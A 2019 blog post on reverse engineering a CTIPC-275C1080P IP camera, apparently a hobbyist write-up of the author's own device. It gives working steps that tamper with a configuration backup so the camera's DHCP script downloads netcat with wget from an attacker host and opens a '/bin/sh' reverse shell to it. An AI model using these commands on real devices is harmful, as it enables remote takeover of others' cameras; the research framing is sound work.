---
layout: post
title:  CTIPC-275C1080P Reverse Shell
date:   2019-03-24 08:59:22 -0700
tags:   hi3518 reverse_engineering linux
---
In the [previous post]({% post_url 2019-03-06-getting_into_the_ctipc-275c1080p %}), we used a command execution vulnerability to clobber `/etc/shadow` with our own known version to allow login via `telnetd` which the vendor kindly left on the device for us.  What if we didn't have the telnet service sitting there waiting for us?  In this post, we'll use a very similar exploit to run a simple `netcat` reverse shell, bypassing the authentication mechanism entirely.

As before, start with a clean `config_backup.bin` acquired by downloading _Backup settings data_ from `System -> Initialize` in the GUI and strip off the header.
```
dd bs=512 skip=1 if=config_backup.bin of=config_backup.tgz
```
We're going to clobber the DHCP dispatcher's comments again, but this time we're going to download `netcat` from our attacking host and then push a shell from the camera.
```
gzip -cd config_backup.tgz |
sed -e 's|# Currently, we only dispatch according to com|wget http://192.168.0.208:8001/nc -O /tmp/nc #|' |
sed -e 's|# elaborate system|chmod +x /tmp/nc #|' |
sed -e 's|# common initialization first, especially|/tmp/nc -e /bin/sh 192.168.0.208 8000 \& #|' |
gzip -c --best > archive.tgz
```
Now, your `default.script` looks like this:
```
#!/bin/sh
wget http://192.168.0.208:8001/nc -O /tmp/nc #mand.  However, a more
chmod +x /tmp/nc # might dispatch by command and interface or do some
/tmp/nc -e /bin/sh 192.168.0.208 8000 & # if more dhcp event notifications
# are added.

exec /mnt/mtd/ipc/conf/udhcpc/default.$1
```
Of course `192.168.0.208` is our attacking host and needs to be on the same network that the camera will be requesting DHCP from.  Because our reverse shell is interactive, in our updated version, the nameserver won't be added to `resolv.conf` until after we exit the shell, but we don't care since we're connecting by IP anyway.
